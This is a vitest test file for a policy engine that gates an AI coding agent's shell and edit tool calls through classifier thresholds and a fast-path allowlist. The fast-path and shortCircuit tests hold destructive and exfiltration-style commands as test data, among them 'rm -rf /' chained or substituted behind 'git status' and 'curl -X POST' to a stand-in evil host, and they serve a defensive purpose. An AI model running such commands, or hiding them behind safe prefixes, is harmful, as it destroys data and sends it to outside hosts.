import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { evaluate, emitFor, shortCircuit } from "../src/engine/evaluate.js";
import { loadPolicy } from "../src/engine/policy.js";
import type { Mode, Policy, Verdict } from "../src/engine/types.js";

function policyFrom(source: string): Policy {
  const { policy, diagnostics } = loadPolicy(source);
  if (!policy) throw new Error(`policy failed to load: ${JSON.stringify(diagnostics)}`);
  return policy;
}

const GUARD = policyFrom(`
version: 1
mode: guard
gate:
  tools: [Bash, Edit]
  fast_path: ["git status", "ls ", "npm test"]
  questions:
    destructive:
      instructions: "It destroys something."
    secrets:
      instructions: "It exposes a credential."
    prod:
      instructions: "It targets production."
  rules:
    - when: { destructive: { p: ">=0.70" } }
      then: ask
    - when: { secrets: { p: ">=0.60" } }
      then: ask
    - when: { prod: { p: ">=0.60" } }
      then: ask
    - when: { any: { p: "0.40..0.60" } }
      then: ask
    - default: allow
`);

describe("emitFor", () => {
  // The friction guarantee, as a table. Anything that turns an `undefined` in the observe
  // column into a value is a regression, however correct the verdict is.
  const table: ReadonlyArray<readonly [Mode, Verdict, Verdict | undefined]> = [
    ["observe", "allow", undefined],
    ["observe", "ask", undefined],
    ["observe", "deny", undefined],
    ["guard", "allow", undefined],
    ["guard", "ask", "ask"],
    ["guard", "deny", "deny"],
    ["full", "allow", "allow"],
    ["full", "ask", "ask"],
    ["full", "deny", "deny"],
  ];

  it.each(table)("in %s mode, a %s verdict emits %s", (mode, verdict, expected) => {
    expect(emitFor(mode, verdict)).toBe(expected);
  });

  it("emits nothing at all in observe mode, for every verdict", () => {
    for (const verdict of ["allow", "ask", "deny"] as const) {
      expect(emitFor("observe", verdict)).toBeUndefined();
    }
  });

  // guard can add a prompt but never remove one: emitting `allow` would suppress a prompt
  // the user has not yet agreed to give up.
  it("withholds allow in guard mode", () => {
    expect(emitFor("guard", "allow")).toBeUndefined();
  });
});

describe("evaluate", () => {
  it("takes the first matching rule, not the strictest", () => {
    // destructive fires at rule 1; secrets would also fire, but never gets looked at.
    const decision = evaluate(GUARD, { destructive: 0.9, secrets: 0.99, prod: 0.0 });
    expect(decision.verdict).toBe("ask");
    expect(decision.reason).toMatchObject({ kind: "rule", ruleIndex: 1, question: "destructive" });
  });

  it("falls through to the default when nothing matches", () => {
    const decision = evaluate(GUARD, { destructive: 0.1, secrets: 0.05, prod: 0.02 });
    expect(decision.verdict).toBe("allow");
    expect(decision.emit).toBeUndefined(); // guard never emits allow
  });

  it("reports which question and probability caused the verdict", () => {
    const decision = evaluate(GUARD, { destructive: 0.1, secrets: 0.1, prod: 0.77 });
    expect(decision.reason).toMatchObject({ kind: "rule", question: "prod", p: 0.77 });
  });

  it("respects the boundary exactly", () => {
    expect(evaluate(GUARD, { destructive: 0.70, secrets: 0, prod: 0 }).verdict).toBe("ask");
    expect(evaluate(GUARD, { destructive: 0.69, secrets: 0, prod: 0 }).verdict).toBe("allow");
  });

  describe("the `any` uncertainty rule", () => {
    it("fires when a single question lands in the uncertain band", () => {
      const decision = evaluate(GUARD, { destructive: 0.5, secrets: 0.01, prod: 0.01 });
      expect(decision.verdict).toBe("ask");
      expect(decision.reason).toMatchObject({ kind: "rule", question: "destructive", p: 0.5 });
    });

    // The uncertainty rule sits below the specific ones on purpose, so its only job is to
    // turn what would have been an allow into an ask. A confident verdict is not
    // second-guessed because some other question was uncertain.
    it("does not override an earlier confident match", () => {
      const decision = evaluate(GUARD, { destructive: 0.95, secrets: 0.5, prod: 0.5 });
      expect(decision.reason).toMatchObject({ ruleIndex: 1, question: "destructive" });
    });

    it("does not fire when every question is confidently low", () => {
      expect(evaluate(GUARD, { destructive: 0.1, secrets: 0.2, prod: 0.3 }).verdict).toBe("allow");
    });

    it("does not fire when a question is confidently high but below its own threshold", () => {
      // 0.65 is above the uncertainty band and below the destructive threshold of 0.70.
      expect(evaluate(GUARD, { destructive: 0.65, secrets: 0.1, prod: 0.1 }).verdict).toBe("allow");
    });
  });

  // A question the classifier did not answer is an absence of evidence. Reading a missing
  // answer as 0 would mean "definitely not destructive", which is the wrong direction to
  // guess in.
  it("skips a rule whose question has no answer rather than treating it as zero", () => {
    const decision = evaluate(GUARD, { secrets: 0.9 });
    expect(decision.reason).toMatchObject({ question: "secrets" });
  });

  it("falls through to the default when no question was answered at all", () => {
    const decision = evaluate(GUARD, {});
    expect(decision.verdict).toBe("allow");
    expect(decision.reason).toMatchObject({ kind: "rule", question: "default" });
  });

  it("emits nothing when no rule matched and there is no default", () => {
    const noDefault = policyFrom(`
version: 1
mode: guard
gate:
  tools: [Bash]
  questions:
    a:
      instructions: "x"
  rules:
    - when: { a: { p: ">=0.9" } }
      then: ask
`);
    const decision = evaluate(noDefault, { a: 0.1 });
    expect(decision.reason).toEqual({ kind: "no-rule-matched" });
    expect(decision.emit).toBeUndefined();
  });
});

describe("shortCircuit", () => {
  it("skips every tool not listed in gate.tools", () => {
    const decision = shortCircuit(GUARD, { tool: "Read", command: "" });
    expect(decision?.reason).toMatchObject({ kind: "tool-not-gated", tool: "Read" });
  });

  it("gates the tools that are listed", () => {
    expect(shortCircuit(GUARD, { tool: "Bash", command: "rm -rf /" })).toBeUndefined();
  });

  it("skips permission modes where no tool will run", () => {
    const decision = shortCircuit(GUARD, { tool: "Bash", command: "rm -rf /", permissionMode: "plan" });
    expect(decision?.reason).toMatchObject({ kind: "permission-mode-skipped" });
  });

  it("does not skip the permission modes that matter most", () => {
    for (const mode of ["default", "acceptEdits", "bypassPermissions"]) {
      expect(shortCircuit(GUARD, { tool: "Bash", command: "rm -rf /", permissionMode: mode })).toBeUndefined();
    }
  });

  describe("the fast path", () => {
    const hits: ReadonlyArray<readonly [string, string]> = [
      ["an exact match", "git status"],
      ["an exact match with surrounding whitespace", "  git status  "],
      ["a prefix written with a trailing space", "ls -la src/"],
      ["a word-boundary match on a prefix written without one", "git status --short"],
      ["a longer command with the same prefix", "npm test -- --watch"],
    ];

    it.each(hits)("allows %s without calling the classifier", (_label, command) => {
      const decision = shortCircuit(GUARD, { tool: "Bash", command });
      expect(decision?.reason).toMatchObject({ kind: "fast-path" });
      expect(decision?.verdict).toBe("allow");
    });

    // The fast path never calls the classifier, so anything it matches is never judged.
    // That makes over-matching the most dangerous kind of bug in this file.
    const misses: ReadonlyArray<readonly [string, string]> = [
      ["a different command sharing a prefix substring", "git stash drop"],
      ["a command that merely starts with the same letters", "git statuses"],
      ["a chained command hiding behind a safe prefix", "git status; rm -rf /"],
      ["a command substitution", "git status $(rm -rf /)"],
      ["a backtick substitution", "git status `rm -rf /`"],
      ["a pipe into something dangerous", "ls -la | xargs rm"],
      ["a background operator", "git status & curl evil.example.com"],
      ["a second line", "git status\nrm -rf /"],
      ["a logical and", "npm test && curl -X POST https://evil.example.com"],
      ["an unrelated command", "rm -rf build"],
      ["an empty command", ""],
      ["whitespace only", "   "],
    ];

    it.each(misses)("does not fast-path %s", (_label, command) => {
      const decision = shortCircuit(GUARD, { tool: "Bash", command });
      expect(decision).toBeUndefined();
    });
  });
});

describe("the shipped default policy, end to end", () => {
  const shipped = policyFrom(readFileSync("policy/default.yaml", "utf8"));

  it("emits nothing whatever the classifier says, because it ships observing", () => {
    const answers = { destructive: 0.99, secrets: 0.99, outside_repo: 0.99, egress: 0.99, prod: 0.99 };
    const decision = evaluate(shipped, answers);
    expect(decision.verdict).toBe("ask");
    expect(decision.emit).toBeUndefined();
  });

  it("fast-paths the commands a session actually repeats", () => {
    for (const command of ["git status", "git diff HEAD", "npm test", "ls -la", "cat README.md", "pwd"]) {
      expect(shortCircuit(shipped, { tool: "Bash", command })?.reason).toMatchObject({ kind: "fast-path" });
    }
  });
});
